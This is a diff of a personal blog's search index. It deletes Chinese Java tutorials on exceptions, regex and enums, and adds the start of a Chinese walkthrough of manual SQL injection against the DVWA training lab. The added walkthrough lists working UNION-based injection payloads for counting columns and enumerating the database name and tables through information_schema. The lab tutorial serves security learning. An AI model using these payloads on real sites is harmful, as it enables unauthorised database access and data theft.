@@ -239,155 +239,304 @@
       </tags>
   </entry>
   <entry>
-    <title>Java-异常</title>
-    <url>/2022/04/16/Java-%E5%BC%82%E5%B8%B8/</url>
-    <content><![CDATA[<h1 id="Java-异常"><a href="#Java-异常" class="headerlink" title="Java-异常"></a>Java-异常</h1><hr>
-<p>参考文献：</p>
-<p><a href="https://jwt1399.top/posts/9855.html#toc-heading-16">https://jwt1399.top/posts/9855.html#toc-heading-16</a></p>
-<hr>
-<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>我们把 Java 中程序执行的不正常情况称为<strong>”异常“</strong>（语法和逻辑错误不算）</p>
-<h3 id="1-Error"><a href="#1-Error" class="headerlink" title="1. Error"></a>1. Error</h3><p>Java虚拟机无法解决的严重问<br>比如：JVM系统内部错误，栈溢出或者OOM</p>
-<h3 id="2-Exception"><a href="#2-Exception" class="headerlink" title="2. Exception"></a>2. Exception</h3><p>可以使用针对性的代码解决的问题<br>比如：空指针访问</p>
-<h4 id="2-1-运行时异常"><a href="#2-1-运行时异常" class="headerlink" title="2.1 运行时异常"></a>2.1 运行时异常</h4><p>此异常编译器查不出来，一般是编程时程序员的逻辑错误。java.lang.RuntimeException类及它的子类都是运行时异常。<br>对于运行时异常，一般可以不做处理。</p>
-<h4 id="2-2-编译异常"><a href="#2-2-编译异常" class="headerlink" title="2.2 编译异常"></a>2.2 编译异常</h4><p>编译时异常，是编译器必须要处理的异常。</p>
-<p><img src="https://colson-max.github.io/2022/04/16/Java-%E5%BC%82%E5%B8%B8/1.png" alt="1"></p>
-<h2 id="异常处理方式"><a href="#异常处理方式" class="headerlink" title="异常处理方式"></a>异常处理方式</h2><h3 id="try-catch-finally"><a href="#try-catch-finally" class="headerlink" title="try-catch-finally"></a>try-catch-finally</h3><p>程序员在代码中捕获发生的异常，自行处理。</p>
-<p>Java提供了 try块 和 catch块 来处理异常。try 块用于包含可能出错的代码。catch 块用于处理 try 块中发生的异常。可以根据需要在程序中有多个try.catch块。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Try_And_Catch</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            String str = <span class="string">&quot;测试&quot;</span>;</span><br><span class="line">            <span class="keyword">int</span> a = Integer.parseInt(str);</span><br><span class="line">            System.out.println(<span class="string">&quot;数字：&quot;</span> + a );</span><br><span class="line">        &#125;<span class="keyword">catch</span> (NumberFormatException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;异常信息：&quot;</span> + e.getMessage());</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;最后代码块被执行&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;程序继续&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1.如果发生异常，则异常之后的代码不会被执行，直接进入 catch 板块</span></span><br><span class="line"><span class="comment">2.如果没发生异常，则顺序执行 try 板块，不会进入 catch 板块</span></span><br><span class="line"><span class="comment">3.如果希望是否发生异常都执行某段代码，则使用 finally 板块</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Try_And_Catch02</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Person person = <span class="keyword">new</span> Person();</span><br><span class="line">            person = <span class="keyword">null</span>;</span><br><span class="line">            System.out.println(person.getName());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NullPointerException e)&#123;           <span class="comment">//空指针异常在前</span></span><br><span class="line">            System.out.println(<span class="string">&quot;空指针异常：&quot;</span> + e.getMessage());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.out.println(e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">4.使用 try 代码块可能有多个异常。我们可以使用多规格 catch 语句来捕获多个不同的异常（进行不同的异常处理）</span></span><br><span class="line"><span class="comment">    要求：父类异常在后，子类在前</span></span><br><span class="line"><span class="comment"> 如果发生异常，只会匹配一个catch块</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name = <span class="string">&quot;colson&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Try_And_Catch03</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">int</span> n1 = <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">int</span> n2 = <span class="number">0</span>;</span><br><span class="line">            System.out.println(n1/n2);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;执行了finally&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;程序继续执行&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 5. try 和 finally 配合使用，相当于没有捕获异常，因此程序会直接推出。</span></span><br><span class="line"><span class="comment"> *  eg:不管有无异常都必须执行的逻辑代码</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="throws"><a href="#throws" class="headerlink" title="throws"></a>throws</h3><p>将发生的异常抛出，交给调用方法处理，最顶级的处理者就是JVM</p>
-]]></content>
-      <tags>
-        <tag>-Java</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Java-正则</title>
-    <url>/2022/04/19/Java-%E6%AD%A3%E5%88%99/</url>
-    <content><![CDATA[<h2 id="Java-正则表达式"><a href="#Java-正则表达式" class="headerlink" title="Java-正则表达式"></a>Java-正则表达式</h2><hr>
-<p>参考：<a href="https://www.runoob.com/java/java-regular-expressions.html">https://www.runoob.com/java/java-regular-expressions.html</a></p>
-<hr>
-<h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><ol>
-<li>定义了字符串的模式</li>
-<li>可以用来搜索、编辑、处理文本</li>
-</ol>
-]]></content>
-      <tags>
-        <tag>-Java</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Java-枚举</title>
-    <url>/2022/04/12/Java-%E6%9E%9A%E4%B8%BE/</url>
-    <content><![CDATA[<h2 id="Java-枚举"><a href="#Java-枚举" class="headerlink" title="Java-枚举"></a>Java-枚举</h2><hr>
-<h3 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h3><p><a href="https://jwt1399.top/posts/9855.html#toc-heading-7">https://jwt1399.top/posts/9855.html#toc-heading-7</a></p>
-<p><a href="https://www.runoob.com/java/java-enum.html">https://www.runoob.com/java/java-enum.html</a></p>
-<hr>
-<h3 id="一、创建-season-对象"><a href="#一、创建-season-对象" class="headerlink" title="一、创建 season 对象"></a>一、创建 season 对象</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> season;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Enumeration01</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Season spring = <span class="keyword">new</span> Season(<span class="string">&quot;春天&quot;</span>,<span class="string">&quot;温暖&quot;</span>);</span><br><span class="line">        Season summer = <span class="keyword">new</span> Season(<span class="string">&quot;夏天&quot;</span>,<span class="string">&quot;炎热&quot;</span>);</span><br><span class="line">        Season autumn = <span class="keyword">new</span> Season(<span class="string">&quot;秋天&quot;</span>,<span class="string">&quot;凉爽&quot;</span>);</span><br><span class="line">        Season winter = <span class="keyword">new</span> Season(<span class="string">&quot;冬天&quot;</span>,<span class="string">&quot;寒冷&quot;</span>);</span><br><span class="line"></span><br><span class="line">        autumn.setName(<span class="string">&quot;XXX&quot;</span>);</span><br><span class="line">        autumn.setDesc(<span class="string">&quot;xxxxxxxxxx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Season other = <span class="keyword">new</span> Season(<span class="string">&quot;春夏交替&quot;</span>,<span class="string">&quot;时冷时热&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(autumn);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Season</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String desc;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Season</span><span class="params">(String name,String desc)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.desc = desc;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getDesc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> desc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDesc</span><span class="params">(String desc)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.desc = desc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Season&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, desc=&#x27;&quot;</span> + desc + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="二、枚举实现"><a href="#二、枚举实现" class="headerlink" title="二、枚举实现"></a>二、枚举实现</h3><h4 id="1-自定义实现"><a href="#1-自定义实现" class="headerlink" title="1. 自定义实现"></a>1. 自定义实现</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> season;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Enum01</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.println(Season.SPRING);</span><br><span class="line">        System.out.println(Season.SUMMER);</span><br><span class="line">        System.out.println(Season.AUTUMN);</span><br><span class="line">        System.out.println(Season.WINTER);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Season</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span>  String name;</span><br><span class="line">    <span class="keyword">private</span>  String desc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Season SPRING = <span class="keyword">new</span> Season(<span class="string">&quot;春天&quot;</span>,<span class="string">&quot;温暖&quot;</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Season SUMMER = <span class="keyword">new</span> Season(<span class="string">&quot;夏天&quot;</span>,<span class="string">&quot;炎热&quot;</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Season AUTUMN = <span class="keyword">new</span> Season(<span class="string">&quot;秋天&quot;</span>,<span class="string">&quot;凉爽&quot;</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Season WINTER = <span class="keyword">new</span> Season(<span class="string">&quot;冬天&quot;</span>,<span class="string">&quot;寒冷&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Season</span><span class="params">(String name,String desc)</span></span>&#123;         <span class="comment">//将构造器私有化，防止直接new</span></span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.desc = desc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;					  <span class="comment">//去掉 set 方法, 防止属性被修改</span></span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getDesc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> desc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;season&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, desc=&#x27;&quot;</span> + desc + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://colson-max.github.io/2022/04/12/Java-%E6%9E%9A%E4%B8%BE/1.png" alt="1"></p>
-<h4 id="2-enum-关键字实现"><a href="#2-enum-关键字实现" class="headerlink" title="2. enum 关键字实现"></a>2. enum 关键字实现</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> season;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Enum01</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.println(Season.SPRING);</span><br><span class="line">        System.out.println(Season.SUMMER);</span><br><span class="line">        System.out.println(Season.AUTUMN);</span><br><span class="line">        System.out.println(Season.WINTER);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Season</span></span>&#123;		<span class="comment">//使用关键字 enum 替代 class</span></span><br><span class="line">	<span class="comment">//要求将定义常量对象写在最前面，如果有多个常量(对象)， 使用 “,” 号间隔，最后有一个分号结尾</span></span><br><span class="line">    SPRING(<span class="string">&quot;春天&quot;</span>,<span class="string">&quot;温暖&quot;</span>),SUMMER(<span class="string">&quot;夏天&quot;</span>,<span class="string">&quot;炎热&quot;</span>),AUTUMN(<span class="string">&quot;秋天&quot;</span>,<span class="string">&quot;凉爽&quot;</span>),WINTER(<span class="string">&quot;冬天&quot;</span>,<span class="string">&quot;寒冷&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String desc;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">//构造器关键字不能用 public </span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Season</span><span class="params">()</span> </span>&#123;               <span class="comment">//无参</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Season</span><span class="params">(String name, String desc)</span> </span>&#123;           <span class="comment">//有参</span></span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.desc = desc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getDesc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> desc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Season&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, desc=&#x27;&quot;</span> + desc + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>结果和上图一样。</p>
-<h3 id="三、enum-常用方法"><a href="#三、enum-常用方法" class="headerlink" title="三、enum 常用方法"></a>三、enum 常用方法</h3><p>使用关键字 enum ，会隐式继承 Enum 类，所以我们可以使用 Enum 类相关的方法。</p>
-<p>toString：返回的是当前对象名,子类可以重写该方法，用于返回对象的属性信息<br>name：返回当前对象名（常量名），子类中不能重写<br>ordinal：返回当前对象的编号(定义时的位置)，默认从 0 开始<br>values：返回当前枚举类中所有的常量<br>valueOf：将字符串转换成枚举对象，要求字符串必须为已有的常量名，否则报异常！<br>compareTo：比较两个枚举常量，比较的就是编号</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> season;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EnumMethod</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        Season autumn = Season.AUTUMN;      <span class="comment">//使用 Season 枚举类，来演示</span></span><br><span class="line"></span><br><span class="line">        System.out.println(autumn.name());      <span class="comment">//输出枚举对象的名字</span></span><br><span class="line"></span><br><span class="line">        System.out.println(autumn.ordinal());       <span class="comment">// ordinal() 输出的是该枚举对象的编号</span></span><br><span class="line"></span><br><span class="line">        Season[] values = Season.values();      <span class="comment">//</span></span><br><span class="line">        System.out.println(<span class="string">&quot;======遍历出枚举对象（增强for）=====&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(Season season : values)&#123;</span><br><span class="line">            System.out.println(season);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//valueOf：将字符串转换成枚举对象，要求字符串必须为已有的常量名，否则报异常</span></span><br><span class="line">        Season autumn1 = Season.valueOf(<span class="string">&quot;AUTUMN&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;autumn1=&quot;</span> + autumn1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//compareTo：比较两个枚举常量，比较的就是编号</span></span><br><span class="line">        System.out.println(Season.AUTUMN.compareTo(Season.SUMMER));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="四、week实例"><a href="#四、week实例" class="headerlink" title="四、week实例"></a>四、week实例</h3><p>题目：</p>
-<ul>
-<li>声明 Week 枚举类，其中包含星期一至星期日的定义</li>
-<li>MONDAY, TUESDAY, WEDNESDAY, THURSDAY, FRIDAY,SATURDAY, SUNDAY;</li>
-<li>使用 values 返回所有的枚举数组, 并遍历</li>
+    <title>DVWA-SQL注入</title>
+    <url>/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="DVWA-SQL注入"><a href="#DVWA-SQL注入" class="headerlink" title="DVWA - SQL注入"></a>DVWA - SQL注入</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
+<li>建议手工注入，可以了解 sql注入 的过程和原理。</li>
+<li>不建议使用工具比如说 sqlmap 来进行数据库的爆破。</li>
+<li>手工注入步骤：<ul>
+<li>1.找注入点</li>
+<li>2.构造注入内容 </li>
 </ul>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Week;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">example</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">        System.out.println(week.SUNDAY);</span></span><br><span class="line"><span class="comment">        System.out.println(week.MONDAY);</span></span><br><span class="line"><span class="comment">        System.out.println(week.TUESDAY);</span></span><br><span class="line"><span class="comment">        System.out.println(week.WEDNESDAY);</span></span><br><span class="line"><span class="comment">        System.out.println(week.THURSDAY);</span></span><br><span class="line"><span class="comment">        System.out.println(week.FIRDAY);</span></span><br><span class="line"><span class="comment">        System.out.println(week.SATURDAY);</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        </span><br><span class="line">        week[] weeks = week.values();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(week w : weeks)&#123;</span><br><span class="line">            System.out.println(w);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">week</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    SUNDAY(<span class="string">&quot;星期日&quot;</span>),MONDAY(<span class="string">&quot;星期一&quot;</span>), TUESDAY(<span class="string">&quot;星期二&quot;</span>),WEDNESDAY(<span class="string">&quot;星期三&quot;</span>),</span><br><span class="line">    THURSDAY(<span class="string">&quot;星期四&quot;</span>),FIRDAY(<span class="string">&quot;星期五&quot;</span>),SATURDAY(<span class="string">&quot;星期六&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    week(String name) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;week&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<hr>
+<p><strong>强烈建议：</strong>在 docker 上配置 LAMP 环境来搭建靶场，会方便许多，dvwa 是在本地开启的，在本地 windows（ mac 我不知道） 上配置环境会很麻烦。</p>
+<hr>
+<p><strong>参考：</strong></p>
+<p><a href="https://m3lon.github.io/2018/04/02/%E5%9F%BA%E7%A1%80%E7%AF%87-DVWA%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/">https://m3lon.github.io/2018/04/02/%E5%9F%BA%E7%A1%80%E7%AF%87-DVWA%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/</a></p>
+<hr>
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/1.png" alt="1"></p>
+<hr>
+<h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><hr>
+<h3 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h3><ul>
+<li><p>判断是否存在注入，注入是<strong>字符型</strong>还是<strong>数字型</strong></p>
+<p>字符型和数字型的区别在于是否存在引号，所以我们输入 <strong>1</strong>  进行注入</p>
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/3.png" alt="3"></p>
+<p>再输入 <strong>1’</strong>  进行注入</p>
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/2.png" alt="2"></p>
+</li>
+</ul>
+<p>​    根据回显我们可以看出，id 为注入点，而且属于字符型注入。</p>
+<ul>
+<li><p>这样我们就可以通过在语句后面加上注释符可以构造payload来绕过。</p>
+</li>
+<li><p>猜解 SQL 查询语句中的<strong>字段数</strong></p>
+<p>因为要想爆破数据库，就必须通过 Union 查询</p>
+<p>[^一次性查询多条 SQL语句，并将每一条查询语句的结果合并成一个结果集，就需要用到 Union 操作符，这种查询被称为并（union）查询联合查询。类似于连接符 ‘ &amp; ‘ 和管道符 ‘ | ‘]: </p>
+<p>联合查询适用于两种情况：</p>
+<ul>
+<li>从多个表中查询出相似结构的数据，并且<strong>返回一个结果集</strong></li>
+<li>从单个表中多次SELECT查询，将结果<strong>合并成一个结果集</strong>返回。</li>
+</ul>
+<p>所以就要查询 “ 字段数 “，通过 “ order by “ 判断前一个  select 语句的字段数，输入：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 3 #</span></span><br></pre></td></tr></table></figure>
 
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//output:</span></span><br><span class="line">	week&#123;name=<span class="string">&#x27;星期日&#x27;</span>&#125;</span><br><span class="line">    week&#123;name=<span class="string">&#x27;星期一&#x27;</span>&#125;</span><br><span class="line">    week&#123;name=<span class="string">&#x27;星期二&#x27;</span>&#125;</span><br><span class="line">    week&#123;name=<span class="string">&#x27;星期三&#x27;</span>&#125;</span><br><span class="line">    week&#123;name=<span class="string">&#x27;星期四&#x27;</span>&#125;</span><br><span class="line">    week&#123;name=<span class="string">&#x27;星期五&#x27;</span>&#125;</span><br><span class="line">    week&#123;name=<span class="string">&#x27;星期六&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/4.png" alt="4"></p>
+</li>
+</ul>
+<p>​        猜测 3 的时候报错！！说明字段数为 2</p>
+<ul>
+<li><p>输入 “ <strong>1’ union select 1,2 #</strong> “</p>
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/5.png" alt="5"></p>
+</li>
+<li><p>输入” <strong>1’ union select database(),2 #</strong> “，可知数据库名称为 <strong>dvwa</strong></p>
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/6.png" alt="6"></p>
+</li>
+<li><p>获取数据库中的<strong>表名</strong></p>
+<ul>
+<li><p>每一个 mysql 都存在一个系统库 <strong>information_schema</strong> ，所以我们可以构造 payload：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select table_name,2 from information_schema.tables where table_schema=&#x27;</span>dvwa<span class="string">&#x27; #</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="五、-enum-实现接口"><a href="#五、-enum-实现接口" class="headerlink" title="五、 enum 实现接口"></a>五、 enum 实现接口</h3><p>由于 Java 是单继承机制，所以使用 enum 关键字后，就不能再继承其他类。</p>
-<p>但是枚举类和普通类一样可以实现接口。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> 类名 <span class="keyword">implements</span> 接口1,接口2</span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
